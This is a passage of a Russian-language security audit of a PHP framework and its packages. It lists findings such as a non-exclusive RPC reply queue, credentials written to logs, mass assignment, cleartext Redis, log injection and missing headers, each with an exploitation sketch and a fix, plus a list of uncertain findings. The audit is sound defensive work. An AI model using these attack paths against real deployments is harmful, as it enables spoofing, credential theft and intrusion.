**Описание.** `pushRPC()` создаёт RPC reply-очередь через `_declareQueue('')` (624). В `_declareQueue` флаг `exclusive` дефолтит `false` (`$options['exclusive'] ?? false`, строка 446) и для temp/reply-очереди не выставляется, при этом `x-expires = TMP_QUEUE_TTL` (15 минут, строки 45, 407) держит очередь живой долго после отключения caller'а. Exclusive-очереди AMQP доступны только declaring-соединению; так как эта очередь НЕ exclusive, любое другое соединение, узнавшее имя очереди, может публиковать в неё. Это publish-side предусловие, превращающее предсказуемый correlation_id (G5-1/F24) в практический response-spoofing примитив, а 15-минутная персистентность расширяет окно атаки.

**Путь эксплуатации.** Атакующий перечисляет/наблюдает имена reply-очередей (management UI, утечка в логах, паттерны именования) и, поскольку очередь не exclusive и живёт 15 минут, публикует подделанный ответ с угаданным correlation_id. RPC-caller `getFirstMessage()` потребляет его как легитимный ответ.

**Существующая защита.** Нет специфичной. Имя reply-очереди — server-generated (`amq.gen-*`), что даёт обскурити, не безопасность. `x-expires` — механизм cleanup, не security-контроль. Broker-аутентификация — de-facto gating-контроль, но внешний к этому коду. Замечание: реальное предусловие атаки — знание server-generated имени очереди И угадывание `uniqid()` correlation_id; см. uncertain-блок про G5-1/F24 о практической планке.

**Рекомендация.** Объявлять RPC reply-очереди с `exclusive=true` (и `auto_delete=true`) вместо опоры на `x-expires`: `_declareQueue('', ['exclusive' => true, 'auto_delete' => true])`. Exclusive-очереди connection-scoped и не принимают publish от других соединений.

---

### G9-2 — [MEDIUM] InfoDisclosure: hydrated-аргументы пересылаются в PSR error-context без редакции

**Расположение:** `src/Lbaf/ControllerProxy.php:130-139`.

**Описание.** На любой `Throwable` из действия контроллера `ControllerProxy` оборачивает его в `ControllerExceptionWrapper`, чей context включает `'arguments' => $item->arguments`. `AbstractApplication::run()` (`AbstractApplication.php:115-126`) передаёт context в `LogProcessor::process()`, который (`LogProcessor.php:38-46`) мёржит его (вместе с полным Throwable) в массив для `$logger->log()`. Те же credential-несущие значения аргументов пишутся в лог на каждый неуспешный запрос, снова без редакции. Severity ниже success-пути (G9-1), т.к. срабатывает только на ошибках, но раскрываемые данные идентичны (cleartext-секреты).

**Путь эксплуатации.** Атакующий шлёт запрос с валидным Authorization-заголовком / session-cookie, но malformed body, вызывающим downstream-исключение. Фреймворк логирует exception-context с cleartext-токеном рядом со stack trace.

**Существующая защита.** Нет редакции/denylist'а в цепочке. Единственный short-circuit — `LogProcessor.php:18-26`, пропускающий логирование для `CustomException` с `isError===false` (чистые validation-rejection вроде `BadRequestException`); любой настоящий Throwable (PHP `TypeError`/`Error`, `PDOException` и т.п.) логируется с raw-аргументами полностью.

**Рекомендация.** Вырезать/редактировать credential-несущие поля из аргументов до помещения в exception-context, либо вообще не класть raw-значения аргументов в wrapper-context. Применять тот же denylist/Inject-attribute-aware редактор, что и для success-пути (G9-1).

---

### F21 — [LOW] MassAssignment: hydrator mass-assign'ит все public-свойства без opt-out

**Расположение:** `entelisteam/lbaf-hydrator/src/Internal/HydratorEngine.php:232-244, 51-59`.

**Описание.** `getClassDefinition()` собирает каждое non-static/non-private/non-protected свойство, а `createClassFromDefinition()` пишет каждое из входных данных, включая readonly через `ReflectionProperty::setValue`. Нет allow-list/deny-list/fillable-механизма и нет атрибута для исключения свойства. Любое public-свойство устанавливается из недоверенного входа. Для чистых DTO это намеренно, но если DTO несёт server-derived state (`public bool $isAdmin`, `public int $ownerId`) и hydrate'ится из клиентского входа, клиент его перезаписывает; типизированное свойство PHP ограничивает тип, но не значение. (Это более общая формулировка корня, чем G1-1, которая привязана к конкретному resolution→instantiation потоку.)

**Путь эксплуатации.** Приложение переиспользует DTO с `public bool $isApproved = false;` и как input-DTO, и как domain-объект. Hydration `{"isApproved":true}` или `{"accountId":<чужой id>}` перезаписывает поле → обход авторизации/владения, когда DTO позже трактуется как доверенный.

**Существующая защита.** Нет opt-out. Существуют только `Map` (переименование) и `ArrayTypeOf` (типизация элементов) — ни один не ограничивает, какие свойства пишутся. Частично: типизированные свойства PHP ограничивают тип (не значение); `fillArgs` пишет свойство только если клиент явно прислал ключ (`isset`), иначе остаётся default.

**Рекомендация.** Дать opt-out (`#[Ignore]`/`#[NotHydratable]`, либо hydrate'ить только аннотированные свойства/конструктор-параметры) и задокументировать, что все public-свойства client-writable.

---

### F23 — [LOW] Crypto/TransportSecurity: Redis по умолчанию cleartext, без TLS/peer-verification

**Расположение:** `src/Lbaf/Database/Redis.php:30-73`.

**Описание.** `RedisConfig` дефолтит `$tlsVerifyPeer = null`; в `Redis::connect()` `null` даёт пустой stream-context и bare host/port-соединение без `tls://`-схемы, так что канал не шифрован, а AUTH-пароль/user идут открытым текстом (`Redis.php:64-69`). Даже при включённом TLS единственный knob — один boolean, одновременно задающий `verify_peer` и `verify_peer_name`; нет CA-bundle/peer-name pinning. Значения, читаемые из Redis, возвращаются как доверенные строки.

**Путь эксплуатации.** Приложение использует managed/remote Redis. Так как TLS off по умолчанию и host без `tls://`-схемы, AUTH-креды и все кэш-значения идут по сети открытым текстом; on-path атакующий перехватывает пароль или подменяет значения.

**Существующая защита.** Для транспортного шифрования по умолчанию — нет. Opt-in возможен: оператор может задать `host = "tls://my-redis"` (host передаётся дословно в `\Redis::connect()`/`pconnect()`) и `tlsVerifyPeer = true` для верифицированного TLS-канала. Но secure-дефолта нет, и нет CA-file/expected-peer-name knob.

**Рекомендация.** Дефолтить TLS для non-loopback Redis (`tls://`-схема или явный `useTls`-флаг), дефолтить `tlsVerifyPeer` в `true` (только opt-out), разрешать указание CA-file / expected peer-name.

---

### F25 — [LOW] LogInjection: raw attacker-controlled Rabbit message body пишется в error log

**Расположение:** `src/Lbaf/Daemon/Daemon.php:112-113`.

**Описание.** На любое исключение при обработке сообщения демон пишет raw, несанитизированное AMQP message body в error log (`error_log('Exception occurred when processed message: ' . $msg->getBody())`). Body attacker-controlled и может содержать newlines/control-символы, позволяя подделывать строки лога, ломать парсеры или инжектить terminal escape-последовательности.

**Путь эксплуатации.** Атакующий публикует сообщение с CRLF + подделанной строкой лога (или terminal escape-кодами). При неуспешной обработке body error_log'ится → подделанные строки внедряются в лог-поток.

**Существующая защита.** Нет: raw body конкатенируется в `error_log()` без экранирования, без stripping control-символов, без усечения длины. Соседняя строка 113 логирует `$throwable->getMessage()`, который тоже может нести attacker-derived строки.

**Рекомендация.** Санитизировать/кодировать body перед логированием (`json_encode` или strip/escape control-символов) и усекать до ограниченной длины.

---

### F26 — [LOW] LogInjection: message и trace исключения логируются через error_log-fallback без санитизации

**Расположение:** `src/Lbaf/Logger/LogProcessor.php:29-31`.

**Описание.** Когда PSR-логгер не подан, `LogProcessor` падает в `error_log()` с raw exception message и полным trace (`AbstractApplication::$logger` дефолтит `null`, строка 45, так что fallback достижим). Сообщения исключений часто содержат attacker-controlled значения; newlines/control-символы пишутся дословно, позволяя log forging. Полный trace также утекает file-пути в логи.

**Путь эксплуатации.** Атакующий шлёт вход, который приложение интерполирует в exception message (`Invalid value: <user input>`). Без сконфигурированного логгера сообщение error_log'ится неэкранированным; атакующий встраивает CRLF + подделанную запись.

**Существующая защита.** Частично: в `LogProcessor::process` (18-26) любой `CustomException` с `isError===false` возвращается рано БЕЗ логирования — это отфильтровывает самые request-input-несущие исключения (`RouteNotFoundException` с `rawurldecode`'нутым REQUEST_URI, `BadRequestException`, `InjectArgumentTypeException`). error_log-fallback срабатывает только при отсутствии PSR-логгера. Санитизации newlines/control-символов нет.

**Рекомендация.** Экранировать control-символы/newlines перед `error_log`, предпочитать structured PSR-логгер, избегать дампа полных trace'ов в общий лог без санитизации.

---

### F27 — [LOW] InfoDisclosure: модель исключений не разделяет client-safe и internal сообщение

**Расположение:** `entelisteam/lbaf-exception/src/CustomException.php:12-44`.

**Описание.** `lbaf-exception` моделирует все данные ошибки одним `$message`/`$context`, который downstream-контроллеры рендерят прямо клиентам. Нет различения operator-facing internal-сообщения и client-safe-сообщения. Это корневая причина, делающая находки F2/F3/F14 неизбежными.

**Путь эксплуатации.** Service-коннектор бросает `InnerServiceException`/`UnexpectedException`, чьё сообщение включает internal base URL/endpoint/raw upstream-ответ. Так как нет концепции client-safe-сообщения, web/api error-рендереры выдают этот internal-текст удалённому caller'у.

**Существующая защита.** `LogLevelEnum`/`isError` разделяют logging-vs-not, но нет production/debug-гейта и нет client-safe-message концепции. Единственная структурная защита: public `$context` читается только `LogProcessor::process` (server-side log), но не client-facing `_createErrorResponse`-рендерерами — так что внутренности context не достигают клиентов; однако сам `$message` рендерится клиентам безусловно.

**Рекомендация.** Добавить явное client-safe-сообщение (и/или boolean «можно ли показывать клиенту») в `CustomException`; контроллеры в production рендерят только client-safe-сообщение, полный message+context логируют на сервере.

---

### F30 — [LOW] InfoDisclosure: нет `X-Content-Type-Options: nosniff` (и других security-заголовков)

**Расположение:** `src/Lbaf/Response/HtmlResponse.php:17-22` (и `ApiResponse`).

**Описание.** Ни `WebResponse`, ни `ApiResponse` не ставят `X-Content-Type-Options: nosniff`, и нет глобального security-header-слоя. Без nosniff браузеры могут MIME-sniff'ить ответ и интерпретировать attacker-controlled байты как HTML/JS даже при non-HTML Content-Type. (Замечание: Json-packer корректно перезаписывает дефолтный `text/html` на `application/json`, так что JSON не отдаётся как `text/html`; остаточный gap — отсутствие nosniff / базовых security-заголовков.)

**Путь эксплуатации.** Эндпоинт отражает user-supplied байты в ответе с non-rendering Content-Type, но браузер sniff'ит ведущие байты (`<html>...<script>`) и рендерит как HTML.

**Существующая защита.** Нет глобального слоя. `AbstractApplication::sendResponse` (245-266) шлёт только заголовки, прикреплённые к response-объекту. Grep по всему in-scope-коду — ноль вхождений `X-Content-Type-Options`/`X-Frame-Options`/`Content-Security-Policy`/`Referrer-Policy`/HSTS. Частичный позитив: Json-packer overwrite'ит Content-Type на `application/json`.

**Рекомендация.** Добавить `X-Content-Type-Options: nosniff` в дефолтные response-заголовки и, в идеале, базовый набор `X-Frame-Options`/`Referrer-Policy`/`Content-Security-Policy` для HTML-ответов.

## Находки под вопросом (нужна ручная триажная проверка)

Эти находки имеют точные code-level факты, но их эксплуатируемость в пределах ревью либо опровергнута платформенной защитой, либо зависит от downstream-кода приложения, которого нет в scope. Триаж нужен при оценке конкретного приложения, построенного на фреймворке.

- **F7 — html::getTable() XSS (medium→low):** `html::getTable()` (`src/Lbaf/Helper/html.php:6-26`) конкатенирует ключи и значения в HTML без экранирования, а `WebResponse` отдаёт verbatim. Но в scope **ноль вызовов** этого хелпера — XSS целиком зависит от гипотетического downstream-приложения. Реальный, но dormant unsafe-by-default хелпер; хардненинг (`htmlspecialchars` на ключи/значения) оправдан.

- **F10 / G1-3 — unit-enum hydration через constant() (medium→low/info):** `EnumHelper.php:24` подаёт attacker-значение в `constant($targetType . '::' . $value)`. Headline-claim о раскрытии скалярного секрета **опровергнут**: return-type `: object` бросает `TypeError` для скаляра (ловится, даёт 400), а `constant('Enum::class')` бросает Error, а не возвращает FQCN. Остаток: (a) узкий enum-for-enum type-confusion при экзотическом object-valued const, (b) `hydrateValue` (455-461) ловит только `ValueError`, так что несуществующий case даёт 500 вместо 400 — input-validation-консистентность, не утечка/DoS (top-level `catch(Throwable)` сохраняет worker, trace клиенту не уходит). Рекомендация: валидировать против `ReflectionEnum::getCases()` и расширить catch до `\Throwable`.

- **F12 — RedirectResponse open redirect (medium→low):** `RedirectResponse.php:10-16` кладёт `$url` дословно в `Location`-заголовок без валидации (CRLF блокирует сам PHP `header()`). Но `RedirectResponse` **нигде не инстанцируется** в scope; цепочка зависит от app-кода вида `new RedirectResponse(input::get('next'))`. Missing-protection: фреймворк не предоставляет safe-redirect-хелпера.

- **F13 — Curl SSRF / file:// (medium→low):** `Curl::query()` (`Curl.php:44-132`) передаёт URL без protocol-allowlist (libcurl поддерживает `file://`/`gopher://`/`dict://`); `array_replace_recursive` (83) позволяет переопределить `CURLOPT_URL`/`CURLOPT_FOLLOWLOCATION`. Но единственный caller — `AbstractService`, у которого **ноль конкретных подклассов** в scope; taint-путь от request-входа к URL отсутствует. Хардненинг: `CURLOPT_PROTOCOLS_STR='http,https'`, host-allowlist (reject RFC1918/link-local), trusted-only `$curlOptions`.

- **F17 — слабая bool-коэрция (info):** `TypeCaster.php:15` трактует truthy только `'true'`/`'1'`; `'on'`/`'yes'`/whitespace → `false`. Путь reachable, но коэрция строже native `(bool)` (биас в `false`, fail-safe для `if ($flag) doDangerous()`), и атакующий не может через неё инвертировать guard в более пермиссивную сторону. Footgun корректности, не attacker-driven security-issue.

- **F19 — route-cache unserialize() без allowed_classes (low):** `RouteGenerator.php:29,126` подаёт raw cache-байты в `unserialize()` без `allowed_classes`/integrity, `@` скрывает tampering. Но источник — server-controlled cache-файл, не входной surface; нужен отдельный write-primitive. В scope нет авто-вызываемого magic-method gadget'а (единственный `__destruct` пустой). Defense-in-depth: `allowed_classes => [RouteItem::class]`, убрать `@`, хранить как var_export/JSON.

- **F20 — display_var() path traversal / LFI (low):** `AbstractWebController.php:46` конкатенирует `$template` в `require('view/' . $template . '.php')` без нормализации, плюс `extract($params, EXTR_SKIP)`. Метод `protected final` и **не вызывается** ни фреймворком — нужна app-glue вроде `display_var($_GET['tpl'])`. Footgun-API; хардненинг: reject `..`/separators, basename/realpath-containment.

- **F22 — неограниченная рекурсия hydration (low→info):** Рекурсия `createClassFromData`↔`createArrayFromData` без depth-cap, self-referential DTO драйвит вложенность. Но реальные input-парсеры ограничивают глубину (`max_input_nesting_level=64` для form, `json_decode` depth 512), а отказ — graceful `memory_limit`-fatal, не stack-exhaustion/segfault. Под дефолтами PHP DoS не достижим; missing depth-guard — defense-in-depth.

- **F24 / G5-1 — предсказуемый uniqid() correlation_id RPC (low/medium):** `Rabbit.php:625` использует `uniqid()` (time-derived, предсказуемый) для RPC corr_id; `getFirstMessage()` матчит loose `==`, `no_ack=true`, без MAC. Слабость реальна, но: RPC-методы (`pushRPC`/`getFirstMessage`/`replyRPC`) **не вызываются нигде** (помечены `@todo review!`/`@fixme`), эксплуатация требует AMQP-publish-прав И знания server-randomized имени reply-очереди (а не только corr_id). Хардненинг: `bin2hex(random_bytes(16))`, exclusive reply-очередь (см. G5-2), strict `===`, HMAC.

- **G7-2 — `new $this->packerType->value` (info):** Sink инстанцирования ограничен: `PackerType` — backed-enum (Json|MsgPack) из developer-source, attacker не влияет на имя класса. Опровергнуто как object-injection-вектор; реальная опасность — `msgpack_unpack()` (F1/G7-1).

- **G8-1 — Json::unpack() без JSON_THROW_ON_ERROR (medium):** `Json.php:21-24` вызывает `json_decode($data)` без флагов → malformed/over-depth JSON тихо даёт `null`, который для nullable/defaulted Inject-параметра тихо пропускается (`InjectionResolver.php:118-119 continue`), маскируя «attacker прислал мусор» под «поле отсутствует». Частично смягчено: для required-параметра бросается `InjectRequiredArgumentException` (400). Триаж: реальность silent-null зависит от того, как приложение трактует null. Рекомендация: `json_decode($data, true, $depth, JSON_THROW_ON_ERROR)`.

- **G8-2 — input::json() silent-null / DoS (low→info):** `input.php:13-18` вызывает `json_decode($body, TRUE)` без error/depth-handling. Но `input::json()` **не имеет вызовов** в scope; стандартное поведение `json_decode`, DoS ограничен default depth 512 и `post_max_size`. Хардненинг-нота.

- **G9-3 — log injection в PSR message/context (low):** Attacker-строки достигают `$logger->log()` без нейтрализации CR/LF (context `arguments`/`response`). Подтверждаемый канал — context-массивы (на каждый запрос), а headline-пример с message-интерполяцией `BadRequestException` (`AbstractApplication.php:119-126`) **неточен** (это reflection-имя параметра, не attacker-значение; к тому же `isError===false` не логируется). Реальное log-forging зависит от выбранного PSR-handler'а (line-oriented vs JSON).

- **F29 — Header::send() без валидации (low→info):** `Header.php:20-23` вызывает `header()` без валидации имени/значения. CRLF-injection блокирует сам PHP `header()`; остаток (кавычки/точки-с-запятой, «proxy confusion») спекулятивен. Open-redirect-аспект трекается отдельно (F12). Хардненинг-нота.

- **F31 — нет secure-cookie абстракции (info):** Response-слой не имеет Set-Cookie-хелпера; приложения вызывают `setcookie()` напрямую с insecure-дефолтами PHP (HttpOnly/Secure/SameSite off). Фреймворк cookie вообще не пишет, так что это отсутствие feature/хардненинг-нота, а не insecure default в reviewed-коде. Рекомендация: добавить SetCookie-примитив с дефолтами HttpOnly/Secure/SameSite.

- **G4-2 — CLI controller-класс из argv (low→info):** Класс собирается из `$args[0]` под `App\Controller\`. Namespace-traversal (`..\..\`) **не эксплуатируется** (у PHP-namespace нет parent-оператора), `is_subclass_of(AbstractCliController)` ограничивает класс. Остаток — отсутствие allowlist CLI-контроллеров, но argv в CLI контролируется тем, кто запускает бинарь с теми же привилегиями — границы доверия не пересекаются. Хардненинг (CLI route-таблица / строгая валидация `$args[0]`).

## Методология и охват

Ревьюировали ядро фреймворка (`src/Lbaf/**`, `rector/**`) и пять sibling-пакетов (`lbaf-exception`, `lbaf-hydrator`, `lbaf-mysql`, `lbaf-rector`, `php-reflection-helpers`) по каноническим editable-путям, не по `vendor/**` (устаревшие копии — out of scope). Модель угроз: server-side PHP-фреймворк для internet-facing приложений, где attacker-controlled вход поступает через Inject*-атрибуты и `input.php` (HTTP GET/POST/COOKIE/HEADER/ENV), HTTP-роутинг и dispatch, CLI-аргументы, lbaf-hydrator и данные из MySQL/Redis/Rabbit. Процесс: 14 finder-агентов с распределённым покрытием по компонентам, затем 3-линзовая состязательная верификация каждой находки (code-level факты → reachability от недоверенного входа → adversarial-опровержение/подтверждение impact) и критик полноты; в отчёт включены только confirmed-находки, uncertain вынесены отдельно с обоснованием неопределённости.
